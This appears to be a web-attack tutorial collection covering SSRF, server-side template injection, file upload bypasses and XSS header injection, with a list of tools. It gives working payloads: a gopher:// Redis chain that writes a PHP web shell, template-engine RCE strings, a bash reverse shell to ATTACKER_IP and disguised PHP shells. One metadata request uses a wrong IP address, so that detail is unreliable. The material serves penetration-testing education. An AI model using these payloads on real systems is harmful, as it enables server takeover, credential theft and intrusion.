Remote Code Execution (RCE): In some cases, it may be possible to achieve remote code execution on the server by sending specially crafted payloads to certain internal services like Redis.

For these reasons, SSRF is a critical vulnerability listed in the OWASP Top 10 and must be taken seriously.
graph TD
    A[Attacker] --> B{Vulnerable Server};
    B --> C[Firewall Bypass];
    C --> D[Internal Network];
    D --> E[Database];
    D --> F[Admin Panel];
    D --> G[Other Internal Servers];
    B --> H[Cloud Metadata Service <br> 169.254.169.254];
    H --> I[Cloud Credentials];
    B --> J[Local Filesystem <br> file:///etc/passwd];


Where is SSRF Found?
SSRF vulnerabilities can arise in any feature that requires the server to make a server-side request to a URL provided by a user. Common areas include:
1. Importing Data from a URL
Web applications often allow users to import data via a URL, such as fetching a profile picture or product information.

Example Scenario: A feature lets a user upload their avatar from a URL.
Vulnerable Parameter: avatar_url=example.com/avatar.jpg
Attack Vector: An attacker could change this parameter to an internal address like avatar_url=http://127.0.0.1/admin to access the server’s local admin panel.

2. Webhooks
Webhooks send automated notifications to user-configurable URLs. If not validated, these URLs can be pointed to internal services.

Example Scenario: An e-commerce site notifies an inventory system via a webhook when an order is placed.
User-Configured URL: inventory-system.api/notify
Attack Vector: A malicious user could change the webhook URL to an address like http://localhost:8080/sensitive-info to send unauthorized requests.

3. Document and Report Generators
Services that generate PDFs or other documents from web content must fetch the content of the user-provided URL.

Example Scenario: An online tool that converts a web page to a PDF.
Vulnerable Parameter: url_to_convert=my-blog-post.com
Attack Vector: An attacker might read and embed local server files into the PDF by changing the parameter to url_to_convert=file:///etc/hosts.

4. Backend API Calls
In microservice architectures, a client-supplied parameter might determine which internal service to contact.

Example Scenario: An API checks product stock by making a request to a specific store’s internal API.
Request Body: { "productId": "12345", "storeApi": "stock-api-london.internal/" }
Attack Vector: An attacker could attempt to steal credentials by changing the storeApi value to a sensitive address like metadata.internal/latest/credentials.


Detecting and Exploiting SSRF
Step 1: Identifying the Vulnerable Input Point
First, find a parameter that accepts a URL or IP address. Common parameter names include url, uri, path, import, image_url, etc.
Normal Request:
GET /loadImage?image_url=external-site.com/image.png HTTP/1.1
Host: vulnerable-site.com
User-Agent: Mozilla/5.0
Normal Response:
HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 15234
 
[PNG image data...]
Step 2: Basic SSRF Test (Accessing localhost)
The simplest test is to make the server request a resource from itself using localhost or 127.0.0.1.
Request with Payload:
GET /loadImage?image_url=http://127.0.0.1/ HTTP/1.1
Host: vulnerable-site.com
Possible Responses and Analysis:

Successful Response: The server returns HTML content, such as an Apache “It works!” page or an admin login, which confirms the vulnerability.

HTTP/1.1 200 OK
Content-Type: text/html
 
<html><body><h1>It works!</h1></body></html>

Error Message: Errors like “Connection refused” or “Invalid file format” are also strong indicators. They suggest the server attempted the connection but failed, which is different from how it would handle a request to a valid external resource.

Step 3: Scanning the Internal Network and Ports
Once confirmed, an attacker can probe the internal network for other live hosts and open ports.
Request with Payload (Port Scanning):
GET /loadImage?image_url=http://192.168.1.1:8080 HTTP/1.1
Host: vulnerable-site.com
Response Analysis:

Open Port: The response may contain HTML from a web service or simply be different in size or timing compared to a closed port.
Closed Port: A “Connection refused” error is typical.
Filtered Port: The request will likely time out.

Step 4: Using Different URL Schemes
SSRF is not limited to http://. Other schemes can be used depending on the server’s configuration.


Reading Local Files with file:///:


Payload: file:///etc/passwd


Request: GET /loadImage?image_url=file:///etc/passwd


Response: The server may return the contents of the /etc/passwd file.


Sending Complex Requests with gopher://:
The gopher:// scheme can send raw TCP data, making it extremely powerful for interacting with services like Redis or SMTP.


Example (Sending Commands to Redis): This payload sends a SET command to a Redis server on port 6379.


Payload: gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a


Explanation: This URL-encoded payload uses the Redis Serialization Protocol (RESP) to execute SET key value. The gopher:// request sends these raw bytes directly to the Redis port. Gopher requests are often blind, meaning a direct response isn’t returned.


Step 5: SSRF in Cloud Environments
If the application is on a cloud platform (AWS, GCP, Azure), SSRF can be used to access the internal metadata service.
Payload (AWS Metadata Service):
The AWS metadata service is located at the static IP 169.254.169.254.
Request:
GET /loadImage?image_url=http://169.254.169.245/latest/meta-data/iam/security-credentials/admin-role HTTP/1.1
Host: vulnerable-site.com
Response:
The server may return temporary AWS credentials, allowing the attacker to access the cloud account.
HTTP/1.1 200 OK
Content-Type: application/json
 
{
  "Code" : "Success",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "...",
  "Token" : "...",
  "Expiration" : "2024-08-08T18:00:00Z"
}

Escalating from SSRF to RCE
SSRF can be escalated to Remote Code Execution (RCE) by forcing the server to interact with an internal service that can execute commands, such as an unprotected Redis instance.
Scenario: Abusing Redis for RCE
If an attacker can reach an internal Redis server (default port 6379) that requires no authentication, they can send commands to write a web shell to a web-accessible directory.
Step-by-Step Exploitation
The attacker crafts a Gopher payload to send a sequence of Redis commands:

FLUSHALL: Clear the database.
SET shell "<?php system($_GET['cmd']); ?>": Store a PHP web shell in a key.
CONFIG SET dir /var/www/html/: Set Redis’s working directory to the web root.
CONFIG SET dbfilename shell.php: Set the backup filename to shell.php.
SAVE: Write the current data (including the web shell) to shell.php.

The Gopher Payload
The commands must be formatted using the RESP protocol and then URL-encoded.
URL-Encoded Gopher Payload:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%245%0D%0Ashell%0D%0A%2433%0D%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A

When this payload is injected into a vulnerable parameter, the server connects to Redis and executes the commands.
Result:
If successful, a file is created at vulnerable-site.com/shell.php. The attacker can then execute commands via URL parameters, like vulnerable-site.com/shell.php

Tools and Resources

Its “Collaborator Client” feature is highly effective at detecting blind SSRF.Commercialportswigger.net/burpSSRFmapAn open-source Python tool specifically for detecting and exploiting SSRF vulnerabilities.Open Sourcegithub.com/swisskyrepo/SSRFmapNucleiA fast, template-based scanner with a large library of community templates for SSRF detection.Open Sourcenuclei.projectdiscovery.io/Acunetix / InvictiCommercial DAST tools that offer comprehensive automated scans, including SSRF detection.Commercialwww.acunetix.com/

CWSE/SSTI.title: SSTI
CWSE/SSTI.content:
Introduction

What is Server-Side Template Injection (SSTI)?
Server-Side Template Injection (SSTI) is a web security vulnerability that occurs when an attacker can inject malicious code into a template engine used on the server side. Developers often use template engines to generate dynamic web pages. These engines combine a static template file (such as HTML, email, etc.) with dynamic data to produce the final content displayed to the end-user.

If data from the user (like URL parameters, form inputs, etc.) is sent directly to the template engine without proper sanitization, attackers can exploit this situation. By using the template engine’s own syntax, they can execute unexpected commands on the server, access sensitive files, and even gain full control of the server. This makes SSTI a very critical and dangerous type of vulnerability.

What is a Template Engine?
A Template Engine is a common tool in software development. Its primary purpose is to combine data and a template to generate dynamic content. The template usually has a static structure, like HTML, and contains special tags or expressions (placeholders/variables) that specify where the dynamic data should be placed.
We can compare it to a letter template:
Hello {{username}},
 
Your order ({{order_no}}) has been successfully created.
In this template, {{username}} and {{order_no}} are fields to be filled dynamically. The template engine takes this template and the actual data (e.g., “Alice” and “12345”) to produce an output like this:
Hello Alice,
 
Your order (12345) has been successfully created.
Popular template engines include Jinja2 and Mako (Python); Twig and Smarty (PHP); and Freemarker and Velocity (Java).

Important: Template engines do not only substitute variables — many support loops, conditionals, filters, and function calls. SSTI abuses those features.


Impact of SSTI Attacks
The impact of an SSTI vulnerability can vary depending on the template engine used and the application’s configuration, but it is generally quite severe. Potential impacts include:


Remote Code Execution (RCE): attacker runs arbitrary commands → full server control.


Sensitive Data Disclosure: read files like /etc/passwd, DB connection strings, API keys, app source.


Server-Side Request Forgery (SSRF): use server as proxy to internal services.


Denial of Service (DoS): infinite loops or resource exhaustion in templates.



Detection and Identification of the Vulnerability
Detecting an SSTI vulnerability requires a systematic approach. Start by injecting a simple mathematical operation payload and see if the server evaluates it. If the expression is evaluated and the result appears in the response, that’s strong evidence of SSTI.
Step 1: Detecting the Vulnerability
Send payloads containing the template syntax characters ($, {, }, %, <, >) and observe the response.
Example — normal parameter
Request:
GET /profile?name=Jules HTTP/1.1
Host: vulnerable-site.com
...

Response:
HTTP/1.1 200 OK
...
<h1>Welcome, Jules!</h1>
Example — payload injection (Jinja2 syntax {{ ... }})
Request:
GET /profile?name={{7*7}} HTTP/1.1
Host: vulnerable-site.com
...

Three possible responses:

Response 1: No Vulnerability — app treats input as plain text:

<h1>Welcome, {{7*7}}!</h1>

Response 2: Input Sanitized — app encodes/removes dangerous chars:

<h1>Welcome, 7*7!</h1>
<!-- or -->
<h1>Welcome, &lcub;&lcub;7*7&rcub;&rcub;!</h1>

Response 3: Vulnerability Confirmed — template engine evaluated it and returned 49:

<h1>Welcome, 49!</h1>
If you see 49 you can safely conclude SSTI exists.

Step 2: Identifying the Template Engine
After detection, identify the engine — payloads behave differently across engines. Use specialised payloads and observe outputs.

































































PayloadExpected ResultPotential Engine(s){{7*'7'}}49Twig{{7*'7'}}7777777Jinja2{{'a'.toUpperCase()}}AJinja2, Mako, Twig, Nunjucks${7*7}49Freemarker<#assign x="7*7">${x}49Freemarker@{7*7}49Razor (.NET)@(7*7)49Razor (.NET)#{7*7}49Java (JSF)*{{7*7}}**49*Handlebars{{ this.getClass() }}Java object nameJava (General)<%= 7 * 7 %>49Ruby (ERB)
Example: Identifying Jinja2
Send:
GET /profile?name={{7*'7'}} HTTP/1.1

If the server returns 7777777 that indicates Jinja2 (string * int multiplication → repetition). Twig would error out for that payload.

Where to Look for SSTI Vulnerabilities
SSTI can appear anywhere user input is included in a server-side template:


URL parameters (?param=value)


POST data (forms: username, comment, search)


HTTP headers (User-Agent, Referer, X-Forwarded-For)


Cookies (e.g., welcome_message)


File uploads (uploaded file names placed in template responses)


Email templates (marketing/notification systems allowing template editing)


CMS and Wiki pages (user-editable content, macros)



Vulnerability Exploitation
After detection + identification, exploitation begins: from reading sensitive files to RCE. Below are common steps and payloads.
1. Inspecting Context Variables
Dump the template context to see accessible objects/variables.
Jinja2/Twig example:
Request:
GET /profile?name={{self}} HTTP/1.1
Host: vulnerable-site.com
...

Response may show objects like:
<TemplateReference {'config': <Config {'SECRET_KEY': 's3cr3t_valu3', 'DATABASE_URI': '...'} >, 'request': <Request 'vulnerable-site.com/profile#039;>, ...} >

This reveals config with sensitive fields.
2. Accessing Sensitive Information
If config is present:
Request:
GET /profile?name={{config.SECRET_KEY}} HTTP/1.1
Host: vulnerable-site.com
...

Response:
<h1>Welcome, s3cr3t_valu3!</h1>
Leaking API keys, DB passwords, salts, etc.
3. Calling Object Methods
Templates may allow calling methods:
Request:
GET /profile?name={{user.getPassword()}} HTTP/1.1

Response might contain password or hash.
4. Escaping the Sandbox and Reading Files
Goal: climb object model to reach __builtins__ and call dangerous functions, e.g., open.
Jinja2 file read payload:
{{ self.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}
Request:
GET /profile?name={{ self.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }} HTTP/1.1

Response:
<h1>Welcome, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...</h1>
This proves arbitrary file read ability.

Escalating to Remote Code Execution (RCE)
If you can reach builtins like __import__ or eval, you can load modules that execute commands.
RCE in Python (Jinja2)
Payload:
{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
This imports os then runs id via popen() and reads the output.
Response example:
<h1>Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data)!</h1>
After this, any shell command is possible — ls -la, cat /etc/shadow, spawn reverse shells, etc.
PHP (Twig) Environment RCE
Twig is usually safer, but misconfigurations happen.
If system/exec are accessible as filters:
Payload:
{{ ['id']|filter('system') }}
Response:
<h1>Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data)!</h1>
Two-step: define undefined filter callback → call undefined filter.

Register:

{{ _self.env.registerUndefinedFilterCallback("exec") }}

Call:

{{ _self.env.getFilter("id") }}
If passthru already exists:
{{ "ls -la"|passthru }}
Result: command output printed.
Achieving RCE in Twig depends heavily on environment config; it’s harder than Jinja2 but still possible with misconfigurations.

RCE Examples in Other Template Engines

Java (Freemarker)
Payload:

<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }
Creates Execute utility and runs id.

.NET (Razor)
Payload:

@{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }
Uses Process.Start() to execute commands.

NodeJS (Pug/Jade)
Payload:

#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
Loads child_process and runs cat /etc/passwd.

Obtaining a Reverse Shell
After RCE, attacker often attempts a reverse shell.
Attacker listener:
nc -lvp 4444
Bash reverse shell payload (embed into template RCE):
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
Example (Twig filter-based):
{{ ['bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1']|filter('system') }}
When executed, server connects back to attacker listener → interactive shell.

Tools and Resources
Automated tools speed detection/exploitation but manual understanding is invaluable.
Automated Tools
Tplmap


Open-source SSTI detection/exploitation tool (like sqlmap for SSTI).


Github: epinna/tplmap


Example:
python tplmap.py -u "vulnerable-site.com/profile --os-shell
Burp Suite


Industry standard. Active scan may find obvious SSTI. Repeater/Intruder help manual tests.


Extensions: BApp Store has SSTI helpers (e.g., “SSTI Scanner”).


Payload Resources and References


PayloadAllTheThings — large collection of payloads including SSTI: PayloadsAllTheThings/tree/master/Server Side Template Injection


PayloadBox SSTI Payloads — SSTI payload collections.



Mitigations


Keep template and data separate — do not createTemplate/render_template_string with user input as template.


Use framework template rendering with context variables that are escaped by default.


Sanitize and validate user input; whitelist acceptable patterns/characters where possible.


Disable/limit render features, remove risky filters and functions from template environments.


Run web app with least privileges (so if exploited, impact is reduced).


Use runtime protections (WAF), but don’t rely solely on them.


Apply secure coding review & automated testing for template usage.

CWSE/Unrestricted-File-Upload.title: Unrestricted File Upload
CWSE/Unrestricted-File-Upload.content:
File Upload Bypass Techniques
Many web applications implement file upload restrictions to prevent malicious file uploads. However, these protections can often be bypassed using different techniques.

1. MIME Type Bypass
By changing the MIME type to image/png, the upload might succeed:

Content-Type: image/png


If the server only checks the MIME type, it may treat the file as an image and allow upload.

2. File Signature (Magic Header) Bypass
File signatures (magic headers) are sequences of bytes identifying file content. Applications sometimes validate file types using these headers.
Malicious File (cmd.php)
<?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>
To bypass signature checks, prepend the GIF magic header (GIF89a;):
GIF89a;
<?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>
If the server checks for GIF89a, it may believe the file is an image and accept it.

3. File Extension Bypass
Some systems block certain file extensions. Alternative executable extensions can bypass blacklist filters.
Common Extensions

PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .phar
ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action


4. Using .htaccess
The .htaccess file can redefine how certain extensions are handled.
Example:

Upload a malicious file with a non-standard extension (e.g., cmd.bypass):

<?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>

Upload .htaccess with the following content:

AddType application/x-httpd-php .bypass

Now, files with .bypass extension are executed as PHP.

5. Null Byte Injection
Appending a null byte (%00) before a safe extension can bypass filters:
cmd.php%00.jpg

The server may ignore everything after %00 and treat it as .php.

6. Case Sensitivity Tricks
Some systems treat uppercase/lowercase differently. Example:
CMD.PHP

This may bypass case-sensitive extension filters.

CWSE/XSS/HTML-Tag--and--Header-Injection.title: HTML Tag & Header Injection
CWSE/XSS/HTML-Tag--and--Header-Injection.content:
HTML Tag Injection
Input tag
JS can be run using attribute onfocus in a <input> tag. We can then use autofocus tag to automatically run the payload when site is loaded.
Payload: " onfocus="alert(0)" autofocus="
e.g.
<input value= "hello" onfocus="alert(0)" autofocus="">
Anchor tag
We can take advantage of href attribute to run js.
Payload: javascript:alert(0)
e.g.
<a href="javascript:alert(0)"> XSS </a>
Image tag
We can inject js in onerror attribute.
Payload: 0" onerror="alert(0)
e.g.
<img src="0" onerror="alert(0)">
HTTP Header Injection
User-Agent Header
The User-Agent header contains a string used by a client (usually a web browser) to identify itself to a web server. This information typically includes details about the browser type, operating system, and versions. Servers may use this information for content delivery or compatibility purposes. Attackers can inject JavaScript into this header, and if viewed by the admin panel without filtering, the script is executed upon rendering.
User-Agent: Mozilla/5.0 <script>alert('XSS')</script>
Referer Header
The Referer HTTP header indicates the URL of the resource from which the request was initiated. It is often used for analysis, logging, or security purposes. Attackers can inject JavaScript code into this header, which can be executed if viewed by the admin panel without proper sanitization.
Referer: other-site.com <script>alert('XSS')</script>
X-Forwarded-For Header
The X-Forwarded-For header specifies the original IP address from which a request was made. This header is commonly used by load balancers and proxy servers. Attackers can inject JavaScript into this header, and if viewed without filtering, for instance, by an admin panel, the script can be executed.
X-Forwarded-For: 198.51.100.15 <script>alert('XSS');</script>

CWSE/XSS/XSS-Vulnerability-Scanning-Tool.title: XSS Vulnerability Scanning Tools
CWSE/XSS/XSS-Vulnerability-Scanning-Tool.content:
It is possible to detect or exploit XSS vulnerabilities using automated tools. Many free and paid tools are available for this purpose, some of which are also open source. Below are some of the frequently used tools:
XSStrike
XSStrike is an advanced XSS detection tool developed in Python. It features fuzzing, DOM-based XSS detection, and the ability to evade various filters and barriers. XSStrike can scan a URL, test parameters, and automatically perform tests for Reflected and Stored XSS vulnerabilities using XSS attack vectors. Additionally, it can generate payloads to verify the exploitability of the vulnerabilities.
GitHub Repository: github.com/s0md3v/XSStrike

Installation:
XSStrike can be downloaded from GitHub and installed using Python3 and pip:
git clone github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt
Usage:
To run XSStrike, the following command should be used in the terminal:
python3 xsstrike.py -u "example.com"
This command will perform various tests to detect XSS vulnerabilities on the specified URL.
XSSCon
XSSCon is a simple and lightweight XSS scanning tool developed in Python. It is run via the command line and is used to test specific URLs for XSS vulnerabilities. The tool analyzes the input fields on the specified URL and identifies potential security risks by sending requests with different parameters.
GitHub Repository: github.com/menkrep1337/XSSCon

Installation:
XSSCon can be downloaded and used from GitHub. Ensure that the Python environment is set up (Python 3 is recommended).
Requirements:
pip install bs4
pip install requests
Download:
git clone github.com/menkrep1337/XSSCon.git
chmod 755 -R XSSCon
cd XSSCon
python3 xsscon.py --help 
Usage:
To run XSSCon, navigate to the command line and use the following command with the target URL:
python3 xsscon.py -u "example.com"
This command scans the input fields on the specified URL and performs tests for XSS vulnerabilities.
BeEF (Browser Exploitation Framework)
BeEF is a security tool that operates on web browsers, often used to exploit XSS vulnerabilities. BeEF can control a user’s browser through a JavaScript code injected into it. This tool allows capturing user browsers via vulnerable sites and performing various security tests through these browsers.
GitHub Repository: github.com/beefproject/beef

Installation:
BeEF is written in Ruby. First, ensure that the Ruby environment is installed. Then, execute the following commands to complete the installation:
git clone github.com/beefproject/beef.git
cd beef
./install
Usage:
After starting BeEF, access the web interface at http://localhost:3000/ui/panel and log in as an administrator (default password is ‘beef’). From there, various modules can be used to perform XSS attacks on browsers.
